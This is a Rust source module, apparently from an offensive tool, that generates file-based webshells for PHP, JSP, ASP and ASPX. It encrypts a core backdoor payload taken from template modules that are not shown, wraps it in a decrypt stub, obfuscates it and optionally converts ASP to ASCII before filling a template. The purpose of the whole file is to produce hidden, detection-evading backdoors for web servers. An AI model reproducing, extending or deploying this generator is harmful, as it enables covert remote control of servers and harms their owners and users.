use crate::core::crypto::{self, EncryptionType};
use crate::core::obfuscator::{Obfuscator, ObfuscationLevel, ScriptLanguage};
use crate::core::ascii_conv::AsciiConverter;
use crate::templates;

/// 文件型 WebShell 生成配置
pub struct FileShellConfig {
    pub language: ScriptLanguage,
    pub encryption: EncryptionType,
    pub password: String,
    pub obfuscation: ObfuscationLevel,
    pub asp_ascii: bool,
}

/// 生成文件型 WebShell
pub fn generate_file_shell(config: &FileShellConfig) -> Result<String, String> {
    let template = get_template(config.language);
    let core_code = get_core_code(config.language);

    let (ciphertext, nonce, tag) = crypto::encrypt_data(
        core_code.as_bytes(),
        &config.password,
        &config.encryption,
    )?;

    let encoded_ciphertext = crypto::base64_encode(&ciphertext);
    let encoded_nonce = nonce.map(|n| crypto::base64_encode(&n));
    let encoded_tag = tag.map(|t| crypto::base64_encode(&t));

    let decrypt_stub = build_decrypt_stub(
        config.language,
        &config.encryption,
        &encoded_ciphertext,
        &encoded_nonce,
        &encoded_tag,
        &config.password,
    );

    let obfuscated_code = Obfuscator::obfuscate(
        &decrypt_stub,
        config.language,
        config.obfuscation,
    );

    let final_code = if config.asp_ascii && matches!(config.language, ScriptLanguage::ASP) {
        AsciiConverter::convert(&obfuscated_code)
    } else {
        obfuscated_code
    };

    Ok(template.replace("%s", &final_code))
}

fn get_template(language: ScriptLanguage) -> String {
    match language {
        ScriptLanguage::PHP => templates::php_file_basic::get_template(),
        ScriptLanguage::JSP => templates::jsp_file_basic::get_template(),
        ScriptLanguage::ASP => templates::asp_file_basic::get_template(),
        ScriptLanguage::ASPX => templates::aspx_file_basic::get_template(),
    }
}

fn get_core_code(language: ScriptLanguage) -> String {
    match language {
        ScriptLanguage::PHP => templates::php_file_basic::get_core(),
        ScriptLanguage::JSP => templates::jsp_file_basic::get_core(),
        ScriptLanguage::ASP => templates::asp_file_basic::get_core(),
        ScriptLanguage::ASPX => templates::aspx_file_basic::get_core(),
    }
}

fn build_decrypt_stub(
    language: ScriptLanguage,
    encryption: &EncryptionType,
    ciphertext: &str,
    nonce: &Option<String>,
    tag: &Option<String>,
    password: &str,
) -> String {
    match language {
        ScriptLanguage::PHP => templates::php_file_basic::build_decrypt_stub(
            encryption, ciphertext, nonce, tag, password,
        ),
        ScriptLanguage::JSP => templates::jsp_file_basic::build_decrypt_stub(
            encryption, ciphertext, nonce, tag, password,
        ),
        ScriptLanguage::ASP => templates::asp_file_basic::build_decrypt_stub(
            encryption, ciphertext, nonce, tag, password,
        ),
        ScriptLanguage::ASPX => templates::aspx_file_basic::build_decrypt_stub(
            encryption, ciphertext, nonce, tag, password,
        ),
    }
}
